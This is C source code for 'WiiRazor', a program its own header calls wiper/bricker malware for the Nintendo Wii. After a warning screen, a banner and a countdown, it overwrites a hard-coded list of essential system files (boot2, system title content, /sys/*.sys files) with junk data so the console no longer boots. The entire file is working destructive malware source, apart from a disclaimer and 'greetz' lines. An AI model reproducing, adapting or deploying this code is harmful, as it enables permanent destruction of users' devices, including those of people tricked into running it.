//-------------------------------------------------------------------------------------------------
// 888       888 8888888 8888888 8888888b.         d8888 8888888888P  .d88888b.  8888888b.  
// 888   o   888   888     888   888   Y88b       d88888       d88P  d88P" "Y88b 888   Y88b 
// 888  d8b  888   888     888   888    888      d88P888      d88P   888     888 888    888 
// 888 d888b 888   888     888   888   d88P     d88P 888     d88P    888     888 888   d88P 
// 888d88888b888   888     888   8888888P"     d88P  888    d88P     888     888 8888888P"  
// 88888P Y88888   888     888   888 T88b     d88P   888   d88P      888     888 888 T88b   
// 8888P   Y8888   888     888   888  T88b   d8888888888  d88P       Y88b. .d88P 888  T88b  
// 888P     Y888 8888888 8888888 888   T88b d88P     888 d8888888888  "Y88888P"  888   T88b 
//-------------------------------------------------------------------------------------------------
//      				               WIIRAZOR
//                                   @2021, 2022
//                                Created by Tenor-Z
//-------------------------------------------------------------------------------------------------
//    WiiRazor is a wiper/bricker program written for the Nintendo Wii. It is NOT the first
//    malware written for the Wii, as the caketarts known as Project Dandelion made a piece of malware
//    which completely bricks the system. The samples, however, are considered lost, so it could be
//    more or less true.     		                
//--------------------------------------------------------------------------------------------------

#include <gccore.h>
#include <wiiuse/wpad.h>
#include <fat.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>    														// For O_WRONLY and other file flags
#include <unistd.h>    														// For open(), close()

static void *xfb = NULL;
static GXRModeObj *rmode = NULL;

#define HAVE_AHBPROT ((*(vu32*)0xcd800064 == 0xFFFFFFFF) ? 1 : 0)			// AHBPROT provides developers full access to the Wii's hardware, and is extremely essential
#define MEM_REG_BASE 0xd8b4000
#define MEM_PROT (MEM_REG_BASE + 0x20a)

const u16 isfs_old[] = {0x428B, 0xD001, 0x2566};							// ISFS is also used throughout the program to overwrite files

int free2display = 1;														// This variable only exists to prevent banner looping

void WARNING();
void BANNER();
void countdown(unsigned int count);

/*
This function is responsible for overwriting important files
with garbage data. This is perhaps the simplest method of
bricking possible because it guarantees unrecoverable
damage to system resources. Here, we provide 512 bytes
of useless data to overwrite an important file and render
it unusable and corrupted.
*/

int overwrite_files(const char *file_paths[], int num_files) {
    char junk[512] = {0};
    for (int i = 0; i < num_files; i++) {
        int file = open(file_paths[i], O_WRONLY);							// Open the file
        if (file < 0) {
            perror("Failed to open file");
        } else {
            ssize_t ret = write(file, junk, sizeof(junk));					// Write the garbage data to the file
            if (ret < 0) {
                perror("Failed to write to file");
            }
            close(file);													// And close it
        }
    }
    return 0;
}

/*
The main function that dictates everything else
*/

int main(int argc, char **argv) {

	VIDEO_Init();															// Initialize controller(s) and the screen
    WPAD_Init();

    rmode = VIDEO_GetPreferredMode(NULL);
    xfb = MEM_K0_TO_K1(SYS_AllocateFramebuffer(rmode));

    console_init(xfb, 20, 20, rmode->fbWidth, rmode->xfbHeight, rmode->fbWidth * VI_DISPLAY_PIX_SZ);

    VIDEO_Configure(rmode);
    VIDEO_SetNextFramebuffer(xfb);
    VIDEO_SetBlack(FALSE);
    VIDEO_Flush();
    VIDEO_WaitVSync();
    
    WARNING();																// Display the warning screen first
    sleep(15);
    printf("\e[1;1H\e[2J");
    BANNER();
    sleep(10);
    countdown(9);
    
	/*
	This is just a list of files that will be overwritten.
	It is a collection of essential files that the system
	needs in order to properly function. Corruption of such
	will prevent the console from booting or working as
	expected
	*/

    const char *files_to_overwrite[] = {
        "/title/00000001/00000002/content/boot2",
        "/title/00000001/00000002/content/00000045.app",
        "/title/00000001/00000002/content/00000046.app",
		"/sys/boot.sys",
		"/sys/cc.sys",
		"/sys/cert.sys",
		"/sys/disc.sys",
		"/sys/launch.sys"
    };

    int num_files = sizeof(files_to_overwrite) / sizeof(files_to_overwrite[0]);

    // Overwrite the files
    overwrite_files(files_to_overwrite, num_files);

    return 0;

error:
    while(1) {

        WPAD_ScanPads();
        u32 pressed = WPAD_ButtonsDown(0);
        if (pressed & WPAD_BUTTON_HOME) exit(0);
        VIDEO_WaitVSync();

    }

    return 0;
}


void BANNER(){
    if (free2display = 1);
    { 

		printf("Yb        dP 88 88 88''Yb    db    8888P  dPYb   OO''Yb   \n"); 
		printf(" Yb  db  dP  88 88 OO__dP   dPYb     dP  dP   Yb OO__dP   \n"); 
		printf("  YbdPYbdP   88 88 OO'Yb   dP__Yb   dP   Yb   dP 88'Yb    \n");  
		printf("   YP  YP    88 88 88  Yb dP    Yb d8888  YbodP  88  Yb   \n");
		printf("\n");
        printf("               @Copyright 2021-2022       \n");
        printf("               CREATED BY Tenor-Z         \n");
        printf("If you bought or downloaded this software from another author\n");
        printf("then this software was OBVIOUSLY STOLEN!! If this is the case,\n");
        printf("uninstall this application and look for an authentic version.\n");
    }
}     


void countdown(unsigned int count) {
	printf("\n");
    for (unsigned int i = (count); i > 0; i--) {
        printf("Starting in  %u...\n", i);
        sleep(1);
    }
    free2display = 0;
}


void WARNING() {
    printf("		             WARNING!!							\n");
    printf("========================================================\n");
    printf("   This program is considered malicious.\n");
    printf("\n");
    printf("   Running this program will brick your Nintendo Wii.	\n");
    printf("   If you wish to continue with the bricking process, please\n");
    printf("   wait 15 seconds. If not, turn off your console immediately.\n");
    printf("\n");
    printf("   I am not responsible for unintentional damage to consoles.\n");
    printf("========================================================\n");
    printf("	Greetz to Project Dandelion (pansy Internet strongmen)\n");
    printf("	Also greetz to my Facebook followers, Team Tweezers,\n");
    printf("	the Priiloader crew and everyone else unfortunate\n");
	printf("    enough to find this.\n");
}
